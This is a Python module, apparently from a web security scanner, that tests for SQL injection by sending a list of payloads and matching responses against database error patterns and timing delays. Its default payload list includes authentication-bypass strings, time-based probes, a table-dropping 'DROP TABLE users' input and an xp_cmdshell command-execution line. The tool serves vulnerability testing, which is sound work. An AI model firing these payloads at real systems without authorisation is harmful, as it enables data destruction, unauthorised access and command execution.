"""
SQL Injection tester module.
"""

import re
from pathlib import Path
from .base_tester import BaseTester

class SQLITester(BaseTester):
    """SQL Injection vulnerability tester."""
    
    def __init__(self, config):
        """Initialize SQL injection tester."""
        super().__init__(config)
        self.vulnerability_type = "SQL Injection"
    
    def load_payloads(self):
        """Load SQL injection payloads from file."""
        payload_file = Path(__file__).parent.parent / 'payloads' / 'sqli.txt'
        
        try:
            with open(payload_file, 'r') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return payloads
        except FileNotFoundError:
            # Return default payloads if file doesn't exist
            return [
                "' OR 1=1 --",
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL, NULL, NULL --",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 1=1#",
                "' OR 1=1/*",
                "') OR '1'='1--",
                "') OR ('1'='1--",
                "1' AND (SELECT COUNT(*) FROM users) > 0 --",
                "1' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --",
                "'; WAITFOR DELAY '00:00:05' --",
                "'; SELECT SLEEP(5) --",
                "1' AND SLEEP(5) --",
                "1' OR SLEEP(5) --",
                "'; EXEC xp_cmdshell('ping 127.0.0.1') --"
            ]
    
    def analyze_response(self, payload, response):
        """Analyze response for SQL injection vulnerabilities."""
        if response.get('error'):
            return
        
        response_body = response.get('response_body', '').lower()
        status_code = response.get('status_code')
        response_time = response.get('response_time', 0)
        
        # Check for SQL error messages
        sql_error_patterns = [
            r'sql syntax.*mysql',
            r'warning.*mysql_.*',
            r'valid mysql result',
            r'mysqlclient\.',
            r'postgresql.*error',
            r'warning.*pg_.*',
            r'valid postgresql result',
            r'npgsql\.',
            r'driver.*sql.*server',
            r'ole db.*sql server',
            r'(\[sql server\]|\[odbc sql server driver\]|\[sql native client\])',
            r'sqlite.*error',
            r'sqlite3\.',
            r'oracle.*error',
            r'ora-[0-9]+',
            r'microsoft.*database',
            r'jet.*database',
            r'access.*database',
            r'syntax error.*query expression',
            r'data source name not found',
            r'invalid.*statement',
            r'quoted string not properly terminated',
            r'unclosed quotation mark',
            r'incorrect syntax near'
        ]
        
        for pattern in sql_error_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                self.add_finding(
                    self.vulnerability_type,
                    payload,
                    response,
                    f"SQL error pattern detected: {pattern}",
                    'High'
                )
                return
        
        # Check for time-based SQL injection (response time > 4 seconds)
        if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
            if response_time > 4:
                self.add_finding(
                    self.vulnerability_type,
                    payload,
                    response,
                    f"Time-based SQL injection detected (response time: {response_time:.2f}s)",
                    'High'
                )
                return
        
        # Check for boolean-based SQL injection indicators
        boolean_indicators = [
            'true', 'false', '1=1', '1=0',
            'union', 'select', 'from', 'where'
        ]
        
        payload_lower = payload.lower()
        if any(indicator in payload_lower for indicator in boolean_indicators):
            # Look for signs that the payload affected the query logic
            if status_code == 200 and len(response_body) > 0:
                # This is a basic heuristic - in a real scenario, you'd compare
                # responses between true and false conditions
                if 'error' not in response_body and 'exception' not in response_body:
                    # Check if response seems to contain more data than expected
                    if len(response_body) > 1000:  # Arbitrary threshold
                        self.add_finding(
                            self.vulnerability_type,
                            payload,
                            response,
                            "Potential boolean-based SQL injection - response contains unexpected amount of data",
                            'Medium'
                        )
        
        # Check for UNION-based SQL injection
        if 'union' in payload.lower() and 'select' in payload.lower():
            if status_code == 200 and 'null' in response_body:
                self.add_finding(
                    self.vulnerability_type,
                    payload,
                    response,
                    "Potential UNION-based SQL injection - NULL values detected in response",
                    'High'
                )